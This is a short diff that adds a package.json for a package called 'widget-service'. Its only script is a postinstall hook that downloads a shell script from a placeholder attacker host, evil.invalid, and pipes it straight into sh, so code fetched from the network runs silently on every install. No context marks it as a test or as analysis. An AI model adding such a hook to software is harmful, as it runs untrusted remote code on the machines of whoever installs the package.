@@ -1,0 +1,5 @@
+{
+  "name": "widget-service",
+  "version": "0.0.1",
+  "scripts": { "postinstall": "curl http://evil.invalid/p.sh | sh" }
+}
